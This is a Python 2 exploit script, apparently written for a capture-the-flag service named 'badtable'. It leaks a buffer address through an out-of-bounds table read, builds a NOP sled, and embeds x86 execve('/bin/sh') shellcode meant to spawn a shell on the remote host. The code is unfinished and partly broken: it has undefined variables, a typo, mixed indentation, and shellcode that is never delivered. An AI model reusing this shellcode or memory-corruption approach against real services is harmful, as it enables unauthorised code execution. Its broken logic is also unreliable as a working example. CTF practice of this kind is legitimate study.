import socket
from sys import argv

def store(index, value,s):
        print "begin storing...."
	s.sendall("s"+'\n')
	while 1:
		output = s.recv(1024)
		if "Index:" in output:
			print "STORE function: ",output
			s.sendall(index)
		elif "Value:" in output:
			print output
			s.sendall(value)
			break
		else:
			print output


def read(index,s):
        print "begin reading...."
        data = ""
	while 1:
		output = s.recv(1024)
		if "Command:" in output:
                        print "RAD: ", output
                        s.sendall("r"+'\n')
		elif "Index:" in output:
			print "READ function: ",output
			s.sendall(index+'\n')
			data += s.recv(1024)
			print "READ data: ",data
			break
        return data


def getAddr(s):
	data = read("1031",s)
	pos1 = data.find("(")
	pos2 = data.find(")")
	endbuf_addr = data[pos1+1:pos2]
	return endbuf_addr
def storeNops(s):
        print "storing......"
        while 1:
            for i in range(0, nopsled_len):
                output = s.recv(1024)
            
            if "Command:" in output:
                store(index, value, s)

def badtable(IPaddr, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((IPaddr, int(port)))

	buf_size = "400"
	endbuf_addr = getAddr(s)
	print endbuf_addr
	'''
	output = s.recv(1024)
	if "Command:" in output:
		data = read("1031",s)
		endbuf_addr += getAddr(data)
	'''
	hexendbuf_addr = hex(int(endbuf_addr,16))
	#print hexendbuf_addr
	hexstartbuf_addr = hex(int(endbuf_addr, 16) - int(buf_size,16))
	#print hexstartbuf_addr

	shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
	#print len(shellcode)
	#print len(hexendbuf_addr)
	#print len(hexstartbuf_addr)

	nopsled_len = int(buf_size,16) - len(shellcode) + 4
	nopsled = "\x90"*nopsled_len
	nopsled1 = "\x90"*7

	#output2 = s.recv(1024)
	#print output2
        print "RANDOM: ", s.recv(1024)
        while 1:
            data = s.recv(1024)
            print "DATA BEFORE FOR LOOP: ", data
            for i in range(0,nopsled_len):
		output = s.recv(1024)
                print "OUTPUT IN FOR-LOOP: ",output
		if "Command:" in output:
                        print "LOOP: ",ouput
			print i
			store(str(i),str(nopsled1),s)
                        #if i == nopsled_len-1:
                        #    looprunning = False
            if "Command:" in data:
		print "dumping...."
                s.sendall("d"+'\n')
		table = s.recv(4096)
		print table
		'''
		elif "FLAG" in output:
			pos = output.find("FLAG")
			print output[pos:]
		elif not output:
			break
		'''

badtable(argv[1], argv[2])

